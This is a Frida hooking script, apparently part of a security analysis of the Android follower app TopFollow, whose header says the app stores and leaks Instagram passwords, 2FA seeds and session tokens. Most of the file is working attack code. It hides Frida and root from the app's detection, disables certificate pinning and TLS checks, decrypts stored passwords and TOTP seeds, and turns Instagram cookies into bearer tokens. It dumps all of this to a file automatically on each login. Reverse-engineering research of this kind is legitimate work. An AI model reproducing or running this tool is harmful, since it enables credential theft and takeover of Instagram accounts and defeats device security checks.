/* ============================================================================
 * 04 - CREDENTIAL HARVESTER  (Instagram passwords, 2FA seeds, session tokens)
 * ----------------------------------------------------------------------------
 * WHAT TOPFOLLOW STORES, AND WHERE:
 *
 *  Room DB "t_f_d_b_f_v_c" (NOT encrypted - plain SupportSQLiteOpenHelper, no
 *  SQLCipher / no SupportFactory passphrase anywhere in the DEX):
 *
 *   table `instagram_accounts` (42 columns) - the juicy ones:
 *      u_w   = Instagram PASSWORD  (only "obfuscated" by d.q(), a KEYLESS cipher)
 *      u_a   = Instagram OAuth bearer "Bearer IGT:2:<base64({ds_user_id,sessionid})>"
 *      u_a_t , token , claim , rur , mid , direct_region_hint , fbid_v2 ,
 *      instagram_agent (spoofed UA) , family_device_id , pigeon_session_id ,
 *      time_line_nav_chain / search_nav_chain(_threads) , req_id , last_login
 *   table `two_factors`:
 *      u_n = IG username, u_p = IG PASSWORD (cleartext), s_k = TOTP/2FA SEED
 *   table `device`: coin, gem, hash_type, hash_key, nonce, token, fcm_token
 *   table `app_info`: server-pushed coin economy rates
 *
 *  WebView cookie theft (oa.l1.onPageFinished):
 *      reads CookieManager.getCookie("https://www.instagram.com/") and lifts
 *      `sessionid`, `ds_user_id`, `mid`, then synthesises
 *      "Bearer IGT:2:" + Base64({"ds_user_id":..,"sessionid":..}) and stores it
 *      as u_a.  => a full account takeover from cookies alone, no password.
 *
 *  SharedPrefs "TOPFVC_Shared": ActiveID, ATFLogged, Sign, RID, RD, SND, Aid,
 *      DeviceId, Pin, PinActive, AIT, RIT, Language, SingleTasking, NewTaskType
 *
 *  AND the whole lot is POSTed to the vendor backend:
 *      d.t(account) sets header `Token: <IG session token>` and `Active-Id: <pk>`
 *      on EVERY request to https://top.nivafollower.app/v840/*.php
 *      ha.b case 0 -> POST instagramLogin.php  (body built by native helper.q.r
 *                    with the Instagram User-Agent + DeviceId)
 *
 * This script dumps all of it, in cleartext, and writes JSON to
 * /data/data/com.nivaroid.topfollow/files/topfollow_dump.json
 *
 * Usage: frida -U -f com.nivaroid.topfollow -l 00_common.js -l 01_anti_tamper_killer.js \
 *                                        -l 02_ssl_pinning_bypass.js -l 04_credential_theft.js
 *        then run:  rpc.exports.dump()   (or just wait - it auto-dumps on login)
 * ==========================================================================*/
'use strict';

/* ===========================================================================
 * SELF-ARMING DETECTION BYPASS (mandatory baseline - built into every script)
 * ---------------------------------------------------------------------------
 * TopFollow detects hooks at startup unless the anti-tamper killer is active:
 *   - maps scanner reads /proc/self/maps via __open_2 + read()/__read_chk and
 *     string-matches XOR-0x5A/base64 tokens (frida/xposed/riru/zygisk/substrate)
 *   - 9 su-path probes via access()/open (func#169 @0x13ba30)
 *   - OkHttp CertificatePinner (pin d845591e...6bec5e == signing-cert digest)
 * If 01_anti_tamper_killer.js / 02_ssl_pinning_bypass.js were loaded first they
 * set globalThis.__TF_BYPASS_ARMED and this block is a no-op; otherwise it
 * installs the minimal bypass set so THIS script alone still works on device.
 * =========================================================================*/
(function selfArmBypass() {
  if (globalThis.__TF_BYPASS_ARMED || globalThis.__TF_SELF_ARMED) return;
  globalThis.__TF_SELF_ARMED = true;
  var DENY = ['frida','gum-js','gadget','re.frida','xposed','lsposed','edxposed',
              'riru','zygisk','substrate','libbridge','(deleted)','rwxp','magisk'];
  var ROOT = ['/sbin/su','/system/bin/su','/system/xbin/su','/data/local/xbin/su',
              '/data/local/bin/su','/system/sd/xbin/su','/system/bin/failsafe/su',
              '/data/local/su','superuser.apk'];
  function sus(p) {
    if (!p) return false;
    var l = p.toLowerCase();
    if (l.indexOf('/proc/self/maps') !== -1) return 'maps';
    for (var i = 0; i < ROOT.length; i++) if (l.indexOf(ROOT[i]) !== -1) return 'root';
    return false;
  }
  ['open','open64','fopen','__open_2','openat','access','stat','lstat'].forEach(function (fn) {
    var p = Module.findExportByName(null, fn);
    if (!p) return;
    try {
      Interceptor.attach(p, {
        onEnter: function (a) { try { this.p = a[0].readCString(); } catch (e) { this.p = null; } this.d = sus(this.p); },
        onLeave: function (r) { if (this.d === 'root') r.replace(ptr(-1)); }
      });
    } catch (e) {}
  });
  function scrub(buf, n) {
    if (n <= 0) return n;
    var s; try { s = buf.readUtf8String(n); } catch (e) { return n; }
    if (!s) return n;
    var hit = false, low = s.toLowerCase();
    for (var i = 0; i < DENY.length; i++) if (low.indexOf(DENY[i]) !== -1) { hit = true; break; }
    if (!hit) return n;
    var clean = s.split('\n').filter(function (l) {
      var ll = l.toLowerCase();
      for (var j = 0; j < DENY.length; j++) if (ll.indexOf(DENY[j]) !== -1) return false;
      return true;
    }).join('\n');
    var cb = Memory.allocUtf8String(clean);
    Memory.copy(buf, cb, Math.min(n, clean.length + 1));
    return clean.length;
  }
  var rp = Module.findExportByName('libc.so', 'read');
  if (rp) Interceptor.attach(rp, {
    onEnter: function (a) { this.b = a[1]; },
    onLeave: function (r) { var n = r.toInt32(); if (n > 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
  });
  var rc = Module.findExportByName('libc.so', '__read_chk');
  if (rc) Interceptor.attach(rc, {
    onEnter: function (a) { this.b = a[1]; },
    onLeave: function (r) { var n = r.toInt32(); if (n > 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
  });
  ['strstr','strcmp','strncmp'].forEach(function (fn) {
    var p = Module.findExportByName('libc.so', fn);
    if (!p) return;
    try {
      Interceptor.attach(p, {
        onEnter: function (a) {
          this.hit = false;
          try {
            var s1 = a[0].readCString() || '', s2 = a[1].readCString() || '';
            var l = (s1 + '|' + s2).toLowerCase();
            for (var i = 0; i < DENY.length; i++) if (l.indexOf(DENY[i]) !== -1) { this.hit = true; break; }
          } catch (e) {}
        },
        onLeave: function (r) { if (this.hit) r.replace(ptr(0)); }
      });
    } catch (e) {}
  });
  Java.perform(function () {
    try {
      var CP = Java.use('okhttp3.CertificatePinner');
      CP.check.overload('java.lang.String', 'java.util.List').implementation = function () {};
      try { CP.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function () {}; } catch (e) {}
    } catch (e) {}
    try {
      var SSLContext = Java.use('javax.net.ssl.SSLContext');
      var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
      var EmptyTM = Java.registerClass({
        name: 'com.tf.lab.EmptyTrustManager' + Date.now(),
        implements: [TrustManager],
        methods: {
          checkClientTrusted: function () {},
          checkServerTrusted: function () {},
          getAcceptedIssuers: function () { return []; }
        }
      }).$new();
      var ctx = SSLContext.getInstance('TLS');
      ctx.init(null, [EmptyTM], null);
    } catch (e) {}
  });
  console.log('[bypass] self-arming minimal anti-tamper/SSL bypass installed (load 01+02 for the full set)');
})();

const H = (typeof module !== 'undefined' && module.exports) ? module.exports : H;

function dec(D, v) { if (v === null || v === undefined) return null; const t = String(v); if (!t || t === 'null') return t; try { return D.p(t); } catch (e) { return '<undecryptable:' + t.slice(0, 40) + '>'; } }

const DUMP = { ts: new Date().toISOString(), accounts: [], two_factors: [], device: null, prefs: null, webview_cookies: null };

function writeDump(ctx) {
  try {
    const f = Java.use('java.io.File').$new(ctx.getFilesDir(), 'topfollow_dump.json');
    const FW = Java.use('java.io.FileWriter');
    const w = FW.$new(f, false);
    w.write(JSON.stringify(DUMP, null, 2)); w.flush(); w.close();
    H.log('dump', 'written -> ' + f.getAbsolutePath());
  } catch (e) { H.log('dump', 'file write failed: ' + e); }
  console.log(JSON.stringify(DUMP, null, 2));
}

function harvest(tag) {
  Java.perform(function () {
    let D; try { D = Java.use('com.bumptech.glide.d'); } catch (e) { H.log('!', 'glide.d unavailable'); return; }
    const ctx = H.appContext();

    /* ---- 1. Room: instagram_accounts ---- */
    try {
      const DB = Java.use('com.nivaroid.topfollow.db.MyDatabase');
      const db = DB.setup();
      const list = db.k().g();                       // List<InstagramAccount>
      H.hr('INSTAGRAM ACCOUNTS (' + list.size() + ') - table `instagram_accounts` [' + tag + ']');
      DUMP.accounts = [];
      for (let i = 0; i < list.size(); i++) {
        const a = list.get(i);
        const rec = {
          u_id: String(a.getU_id()), pk: String(a.getPk()), username: String(a.getUsername()),
          full_name: String(a.getFull_name()),
          PASSWORD_PLAINTEXT: dec(D, a.getU_w()),
          u_w_stored: String(a.getU_w()),
          IG_BEARER_PLAINTEXT: dec(D, a.getU_a()),
          u_a_stored: String(a.getU_a()),
          token_sent_to_backend_header: String(a.getToken()),
          account_type: String(a.getAccount_type()),
          mid: String(a.getMid()), rur: String(a.getRur()), claim: String(a.getClaim()),
          direct_region_hint: String(a.getDirect_region_hint()), fbid_v2: String(a.getFbid_v2()),
          instagram_agent_UA: String(a.getInstagram_agent()),
          family_device_id: String(a.getFamily_device_id()),
          pigeon_session_id: String(a.getPigeon_session_id()),
          time_line_nav_chain: String(a.getTime_line_nav_chain()),
          search_nav_chain: String(a.getSearch_nav_chain()),
          media_count: String(a.getMedia_count()), follower_count: String(a.getFollower_count()),
          following_count: String(a.getFollowing_count()),
          collected_coins: a.getCollected_coins(), is_vip: a.getIs_vip(),
          last_login: a.getLast_login(), req_id: a.getReq_id(),
          active: a.getActive(), logout: a.getLogout(), need_authorization: a.getNeed_authorization()
        };
        DUMP.accounts.push(rec);
        console.log('  [' + i + '] ' + rec.username + '  (pk=' + rec.pk + ', u_id=' + rec.u_id + ')');
        console.log('      IG PASSWORD     : ' + rec.PASSWORD_PLAINTEXT);
        console.log('      IG BEARER TOKEN : ' + rec.IG_BEARER_PLAINTEXT);
        console.log('      backend Token hdr: ' + rec.token_sent_to_backend_header);
        console.log('      sessionid/cookies: mid=' + rec.mid + ' rur=' + rec.rur + ' claim=' + rec.claim);
        console.log('      coins=' + rec.collected_coins + ' vip=' + rec.is_vip + ' followers=' + rec.follower_count);
      }
      /* ---- 2. Room: two_factors (TOTP seeds!) ---- */
      try {
        const tf = db.q();                            // TwoFactorDao
        const tl = tf.g ? tf.g() : null;
        if (tl) {
          H.hr('TWO-FACTOR ACCOUNTS (' + tl.size() + ') - table `two_factors`');
          DUMP.two_factors = [];
          for (let i = 0; i < tl.size(); i++) {
            const t = tl.get(i);
            const rec = { u_n: String(t.getU_n()), u_p_PLAINTEXT: dec(D, t.getU_p()),
                          s_k_TOTP_SEED: dec(D, t.getS_k()) };
            DUMP.two_factors.push(rec);
            console.log('  [' + i + '] username=' + rec.u_n + '  PASSWORD=' + rec.u_p_PLAINTEXT + '  2FA-SEED=' + rec.s_k_TOTP_SEED);
          }
        }
      } catch (e) { H.log('2fa', 'raw-SQL fallback: ' + e); }

      /* ---- 3. Room: device (coin/gem/token) ---- */
      try {
        const dv = db.getDevice();
        if (dv) {
          DUMP.device = { coin: dv.getCoin(), gem: dv.getGem(), hash_type: dv.getHash_type(),
                          hash_key: String(dv.getHash_key()), nonce: dec(D, dv.getNonce()),
                          top_token: String(dv.getToken()), fcm_token: String(dv.getFcm_token()) };
          H.hr('DEVICE WALLET - table `device`');
          console.log('  coin=' + DUMP.device.coin + '  gem=' + DUMP.device.gem +
                      '  hash_type=' + DUMP.device.hash_type + '  Top-Token=' + DUMP.device.top_token);
        }
      } catch (e) {}
    } catch (e) { H.log('db', 'MyDatabase harvest failed (app not bootstrapped yet?): ' + e); }

    /* ---- 4. SharedPreferences (ciphered blobs) ---- */
    try {
      const raw = H.dumpPrefs(ctx);
      H.hr('SharedPreferences "TOPFVC_Shared"');
      DUMP.prefs = {};
      Object.keys(raw).forEach(function (k) {
        let shown = raw[k];
        if (['Sign', 'Aid', 'DeviceId', 'RD', 'Pin'].indexOf(k) !== -1) shown = dec(D, raw[k]);
        DUMP.prefs[k] = { stored: raw[k], decoded: shown };
        console.log('  ' + k + ' = ' + shown + (shown !== raw[k] ? '    (stored: ' + raw[k] + ')' : ''));
      });
    } catch (e) { H.log('prefs', e); }

    /* ---- 5. WebView cookie jar for instagram.com ---- */
    try {
      const CM = Java.use('android.webkit.CookieManager');
      const cookie = CM.getInstance().getCookie('https://www.instagram.com/');
      DUMP.webview_cookies = cookie;
      H.hr('WEBVIEW COOKIE JAR  https://www.instagram.com/');
      console.log('  ' + cookie);
      if (cookie) {
        const grab = function (n) { const m = cookie.match(new RegExp(n + '=([^;]+)')); return m ? m[1] : null; };
        const sid = grab('sessionid'), ds = grab('ds_user_id');
        if (sid && ds) {
          const b64 = Java.use('android.util.Base64').encodeToString(
            Java.use('java.lang.String').$new('{"ds_user_id":"' + ds + '","sessionid":"' + sid + '"}')
              .getBytes(Java.use('java.nio.charset.StandardCharsets').UTF_8), 2);
          console.log('  >>> SYNTHESISED OAUTH BEARER (this is exactly what oa.l1 stores as u_a):');
          console.log('      Bearer IGT:2:' + b64);
          DUMP.synthetic_bearer = 'Bearer IGT:2:' + b64;
        }
      }
    } catch (e) { H.log('cookie', e); }

    writeDump(ctx);
  });
}

/* auto-harvest on every login success + on demand */
Java.perform(function () {
  H.cls('ia.v', function (V) {
    V.a.overloads.forEach(function (ov) {           // ia.v.a(v, body) == login success handler
      ov.implementation = function () {
        const r = ov.apply(this, arguments);
        H.log('login', 'ia.v.a() parsed a successful Instagram login -> harvesting');
        setTimeout(function () { harvest('post-login'); }, 1500);
        return r;
      };
    });
  });
  /* hook the password setter so we catch it at the moment of entry */
  H.cls('com.bumptech.glide.d', function (D) {
    D.q.overloads.forEach(function (ov) {
      ov.implementation = function (plain) {
        const out = ov.apply(this, arguments);
        const p = String(plain);
        if (p && p.length > 3 && p.length < 200 && !/^Bearer /.test(p)) {
          H.log('CRED', 'd.q() obfuscating secret -> PLAINTEXT: "' + p + '"  (stored as ' + String(out).slice(0, 48) + '...)');
        }
        return out;
      };
    });
  });
  /* hook oa.l1 cookie theft */
  H.cls('oa.l1', function (L) {
    L.onPageFinished.implementation = function (wv, url) {
      H.log('webview', 'onPageFinished(' + url + ') - cookie harvest routine will run');
      const r = this.onPageFinished(wv, url);
      setTimeout(function () { harvest('post-webview-login'); }, 800);
      return r;
    };
  });
  setTimeout(function () { harvest('initial'); }, 6000);
});

rpc.exports = { dump: function () { harvest('rpc'); }, get: function () { return DUMP; } };
H.hr('credential harvester ARMED (auto-dumps on login; rpc.exports.dump() anytime)');
